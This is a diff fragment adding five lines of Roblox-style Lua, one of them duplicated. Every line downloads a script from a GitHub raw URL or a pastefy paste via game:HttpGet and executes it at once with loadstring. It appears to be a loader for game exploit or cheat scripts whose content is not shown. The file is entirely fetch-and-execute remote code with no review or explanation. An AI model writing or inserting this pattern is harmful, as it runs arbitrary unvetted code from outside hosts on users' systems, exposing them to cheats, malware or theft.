@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sami2funny/sda2/refs/heads/main/newerta.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sami2funny/sda2/refs/heads/main/mains.lua"))()
+loadstring(game:HttpGet('https://pastefy.app/SWHvCtS7/raw'))()
+loadstring(game:HttpGet('https://pastefy.app/SWHvCtS7/raw'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sami2funny/sda2/refs/heads/main/loadingscreen.lua"))()
